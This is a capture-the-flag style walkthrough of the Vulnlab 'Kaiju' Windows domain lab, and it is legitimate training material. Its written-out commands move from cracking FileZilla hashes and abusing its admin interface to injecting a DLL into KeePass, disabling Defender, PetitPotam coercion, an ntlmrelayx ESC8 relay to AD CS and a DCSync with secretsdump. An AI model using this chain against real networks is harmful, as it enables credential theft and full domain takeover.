# Vulnlab - Kaiju

## BERSRV100.kaiju.vl

```bash
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-03-03T20:29:34+00:00; -10s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: KAIJU
|   NetBIOS_Domain_Name: KAIJU
|   NetBIOS_Computer_Name: BERSRV100
|   DNS_Domain_Name: kaiju.vl
|   DNS_Computer_Name: BERSRV100.kaiju.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-03-03T20:29:30+00:00
| ssl-cert: Subject: commonName=BERSRV100.kaiju.vl
| Issuer: commonName=BERSRV100.kaiju.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-25T20:07:28
| Not valid after:  2024-06-25T20:07:28
| MD5:   6276d99a6b5df445831fb4edf399740b
|_SHA-1: e4d1f05a3c0acb5c6cbb96e4e8a5664a58ff5a7f
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## BERSRV200.kaiju.vl

```bash
21/tcp   open  ftp?
| ssl-cert: Subject: commonName=filezilla-server self signed certificate
| Issuer: commonName=filezilla-server self signed certificate     
| Public Key type: ec                
| Public Key bits: 256                 
| Signature Algorithm: ecdsa-with-SHA256
| Not valid before: 2023-12-17T14:33:49
| MD5:   96eb4628bac77bd6ad46b498002002fd
|_SHA-1: ad8550b5089e34a78bb9d8ef3a67668cc3dc5502
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     220-FileZilla Server 1.8.0
|     Please visit https://filezilla-project.org/
|   GetRequest:
|     220-FileZilla Server 1.8.0
|     Please visit https://filezilla-project.org/
|     What are you trying to do? Go away.
|   HTTPOptions, RTSPRequest:
|     220-FileZilla Server 1.8.0
|     Please visit https://filezilla-project.org/                  
|     Wrong command.                             
|   Help:                             
|     220-FileZilla Server 1.8.0                         
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)       
| ssh-hostkey:
|   3072 08c7c66a51482a073f9e880ce2ff2cb9 (RSA)
|   256 7596f0688a0369abe49b3e5a17a8ab24 (ECDSA)
|_  256 d48eadd323a97b7b7b169f86cbaba355 (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Services 
| ssl-cert: Subject: commonName=BERSRV200.kaiju.vl
| Issuer: commonName=BERSRV200.kaiju.vl
```

## BERSRV105.kaiju.vl

```bash
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: KAIJU
|   NetBIOS_Domain_Name: KAIJU
|   NetBIOS_Computer_Name: BERSRV105
|   DNS_Domain_Name: kaiju.vl
|   DNS_Computer_Name: BERSRV105.kaiju.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-03-03T20:35:39+00:00
| ssl-cert: Subject: commonName=BERSRV105.kaiju.vl
| Issuer: commonName=BERSRV105.kaiju.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-20T14:50:42
| Not valid after:  2024-07-21T14:50:42
| MD5:   75ab9d8dcba8f772b61a263ae82b1cfa
|_SHA-1: 189c63c9071bab279700c2df14082b4931ce7724
|_ssl-date: 2024-03-03T20:35:44+00:00; -9s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

BERSRV200.kaiju.vl host has FTP service enabled, trying the `anonymous` login didn't worked

<img src="https://i.imgur.com/GIcuOoZ.png"/>

Trying different logins from hacktricks

<img src="https://i.imgur.com/oR5aBFz.png"/>

Here trying to login `ftp` worked and didn't required any password

<img src="https://i.imgur.com/jOpiwqZ.png"/>

From the passwords directory, we see few text files

<img src="https://i.imgur.com/cKmKoB6.png"/>

<img src="https://i.imgur.com/RUKgNMp.png"/>

We don't get anything other than just hinting us that local administrators is saved in keepas, from the `config` directory, we have `users.xml`

<img src="https://i.imgur.com/7nulrf9.png"/>

<img src="https://i.imgur.com/XWUP6kh.png"/>

Here we have a username `backup` with his password hash, searching for filezilla hashes on hashcat wiki showed a different hash which was for versions till 0.9.55 

<img src="https://i.imgur.com/Vt3VKjg.png"/>

Searching on filezilla forums we can learn that `PBKDF2-HMAC-SHA256` is used for hashing in version 1.8.0

<img src="https://i.imgur.com/siQirCZ.png"/>

This can be cracked in hashcat with mode 10900 by formatting the hash like this

```
iterations:base64 salt:base64 digets
```

<img src="https://i.imgur.com/2s7L9pf.png"/>

We just need to convert it into a proper format 

```bash
sha256:100000:aec9Yt49edyEvXkZUinmS52UrwNoNNgoM+6rK3fuFFw:ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU
```

But cracking this hash with `rockyou.txt` didn't worked as it was showing 20 hrs for this hash to be cracked

<img src="https://i.imgur.com/UNrKTiM.png"/>
##  Getting a shell as backup user

So taking a hint from vulnlab forums, we may need to come up with a custom wordlist but what could we be the custom list, we know this is a password for `backup` user, from the ftp we had files including passwords like `firewall123` so combining the year and name of the box we can create a list 
`
```bash
kaiju123
kaiju
kaiju2023
kaiju2024
backup
backup2023
backup2024
```

Also including hash cat rules to crack this hashcat

```bash
hashcat -a 0 -m 10900 ./hash.txt custom_list -r hob064.rule  --force
```

<img src="https://i.imgur.com/OZ1MLpU.png"/>

Now we can ssh using backup user on `BERSRV200.kaiju.vl` host

<img src="https://i.imgur.com/PRMOw9d.png"/>

Going back to filezilla configuration file, we can see there's drive E:\

<img src="https://i.imgur.com/y9UBSPH.png"/>

This drive has `FIlezilla server` directory, from the logs, this tells us that this server is running as `sasrv200` user 

<img src="https://i.imgur.com/JE0fs1a.png"/>

And from the `install.log` we can find filezilla server's admin password hash

<img src="https://i.imgur.com/G69ruID.png"/>

```
sha256:100000:AdRNx7rAs1CEM23S5Zp7NyAQYHcuo2LuevU3pAXKB18:mSbrgj1R6oqMMSk4Qk1TuYTchS5r8Yk3Y5vsBgf2tF8:
```

 This hash can also be cracked using the same list that we created

<img src="https://i.imgur.com/0BBYuO1.png"/>

The port for administrator server is 14148, this can be checked from the logs

<img src="https://i.imgur.com/VQ2JiYk.png"/>

## Abusing filezilla to escalate as sasrv200

Since this is running locally, we need to perform port forwarding through ssh

```bash
ssh -L 4444:localhost:14148 backup@BERSRV200.kaiju.vl
```

<img src="https://i.imgur.com/6JYoxfq.png"/>
<img src="https://i.imgur.com/F4T0Bit.png"/>

Using filezilla server version 1.8.0 (filezilla-server-gui) we can access the administrator interface on port 4444

<img src="https://i.imgur.com/PvEYs0y.png"/>
<img src="https://i.imgur.com/kdnBnUx.png"/>

But on interacting with anything it kept showing this error

<img src="https://i.imgur.com/P6GL9KA.png"/>

We can still add our user by exporting the configuration file, then importing it again with the changes

<img src="https://i.imgur.com/Z0MeHuE.png"/>

Since this is being ran as sasrv200, changing the mount path to `C:\Users\sasrv200`

<img src="https://i.imgur.com/kZBjUXE.png"/>

Accessing ftp with backup user, we'll land into sasrv200 directory with write permissions

<img src="https://i.imgur.com/k9Z07Pa.png"/>

Here we can just create a .ssh folder, place our ssh public key and login as sasrv200 

<img src="https://i.imgur.com/tKbiTvC.png"/>

<img src="https://i.imgur.com/j7yJlLx.png"/>
## Reading local admin password through keepass

For escalating our privileges, we saw a note for local administrator password that it's moved to KeePass, we can find `it.kdbx` from `E:\` drive

<img src="https://i.imgur.com/Tl08DNB.png"/>

Copying this file to sasrv200's directory and then downloading it through FTP


<img src="https://i.imgur.com/QNYN39w.png"/>

Extracting john/hashcat hash format for cracking the password, but it didn't worked as the hash was not crackable

<img src="https://i.imgur.com/nAgAmiZ.png"/>
<img src="https://i.imgur.com/5DihqUx.png"/>

Going back to keepass directory, there's Plugins which is owned by sasrv200, we 
have write permissions 

<img src="https://i.imgur.com/KuB2wKP.png"/>

Checking the running process using `Get-Process` , we don't have anything related to keepass, but constantly monitoring for keepass we will keep seeing this process being spawned

```powershell
while ($true) {
    Clear-Host
    Write-Host "Monitoring running processes containing 'keepass':"
    $Process = Get-Process | Where-Object { $_.ProcessName -like '*keepass*' }
    $Process | Format-Table -AutoSize
    Start-Sleep -Seconds 1
}
```

<img src="https://i.imgur.com/nHSBfwX.png"/>

<img src="https://i.imgur.com/HYQILbM.png"/>

This could also be monitored through Winpspy https://github.com/xct/winpspy but we can move on now that we know keepass is constantly being ran, since we have write access on plugins folder, to abuse this we need to compile a DLL https://github.com/d3lb3/KeeFarceReborn which will export the credentials in keepass database once it gets injected in keepass process, also enabling plugins and export functionalities in `KeePass.config.xml` 

<img src="https://i.imgur.com/l6wSUwz.png"/>
<img src="https://i.imgur.com/FUaT5Eh.png"/>

For using KeeFarceReborn, we need to retrieve keepass.exe from the target machine, edit the source code to remove the message boxes and change the path where we want the xml file
<img src="https://i.imgur.com/qu5WETl.png"/>

<img src="https://i.imgur.com/FM1lbtt.png"/>

Going to `C:\ProgramData` we'll find the export.xml file having the local admin password

<img src="https://i.imgur.com/JdCgjXI.png"/>
<img src="https://i.imgur.com/WqDBrPK.png"/>

Having the password we can login as local admin on BERSRV200, now to dump hashes we need to use ssh dynamic port forwarding as most of the ports are running locally

```
ssh administrator@BERSRV200 -D 1080
```

In the proxychains.conf, make sure to have the port which you have specified for dynamic port forwarding

<img src="https://i.imgur.com/868daEH.png"/>
<img src="https://i.imgur.com/q5Jz28S.png"/>
Dumping lsass through lsassy module but due to defender being enabled this did not work

<img src="https://i.imgur.com/dgymIUa.png"/>
Since we already are local admin, we can just disable defender 

<img src="https://i.imgur.com/u8VpPQw.png"/>
<img src="https://i.imgur.com/6L2bZci.png"/>

Uploading sharphound.exe through ftp and running it with sasrv200's plain text password

```bash
SharpHound.exe --ldapusername sasrv200 --ldappassword pass -d kaiju.vl -c all
```

<img src="https://i.imgur.com/FM5BgK7.png"/>

Bloodhound doesn't bring anything interesting apart From claire.forst can RDP into BERSRV200 which seems useless as we already have local admin on that host

<img src="https://i.imgur.com/klv4FTA.png"/>

But we can use this user to see if there's ADCS server in this domain

```bash
proxychains nxc ldap BERSRV100.kaiju.vl -u Clare.Frost -H ':hash' -M adcs 
```

<img src="https://i.imgur.com/HM6Lxx9.png"/>

Checking for vulnerable templates through certipy

<img src="https://i.imgur.com/eGaifZv.png"/>

<img src="https://i.imgur.com/G2pkaLu.png"/>

This doesn't show any vulnerable templates instead there's web enrollment enabled which can be abused, known as `ESC8`  by performing coercion using any PoC on domain controller, relaying that machine account hash on ADCS server to get DC's ticket but the problem is we can't receive coercion if we ran it from our machine, so we need to redirect traffic coming on port 445 of BERSRV200 to a different port  (port mapping/ port redirect) and then do remote/reverse port forward ( depending if we are redirecting the traffic locally)

StreamDivert can be used here for port bending, transferring all required files via ftp, scp or by disabling firewall rules

<img src="https://i.imgur.com/hZOmARr.png"/>

We are going to redirect all traffic incoming on port 445 on to our kali IP, the config file for stream divert will look like this 

```powershell
tcp < 445 0.0.0.0 -> 10.8.0.136 445
```

<img src="https://i.imgur.com/BT2qXUI.png"/>

To confirm if we can perform coercion, start responder with smb set to On

<img src="https://i.imgur.com/dqN4rIp.png"/>

Using PetitPotam for coercion

<img src="https://i.imgur.com/OY6WfbE.png"/>

Now that we have confirmed that coercion is working, we can realy this authentication on ADCS server using ntlmrealyx also shutting smb and http server off from responder

<img src="https://i.imgur.com/p9KhquW.png"/>

```bash
proxychains ntlmrelayx.py -t http://BERSRV105.kaiju.vl/certsrv/certfnsh.asp -smb2support --adcs --template DomainController 
```

<img src="https://i.imgur.com/mfZGylx.png"/>

We'll receive DC's certificate through which we can request the TGT or AES key of domain controller through PKINIT authentication and then perform DCsync

```bash
proxychains python3 /opt/PKINITtools/gettgtpkinit.py -pfx-base64 $(cat ./DC.b64) -dc-ip 10.10.210.133 kaiju.vl/'BERSRV100$' dc.ccache
```

<img src="https://i.imgur.com/RX0XpiA.png"/>

Using the TGT to dump administrator's hash

```bash
proxychains secretsdump.py -k -no-pass kaiju.vl/'BERSRV100$'@BERSRV100.kaiju.vl
```

<img src="https://i.imgur.com/TzVgk5S.png"/>

<img src="https://i.imgur.com/3shINBI.png"/>

# References


- https://forum.filezilla-project.org/viewtopic.php?f=6&t=56283
- https://hashcat.net/forum/thread-7854.html
- https://www.alitajran.com/disable-windows-firewall-with-powershell/
- https://github.com/jellever/StreamDivert
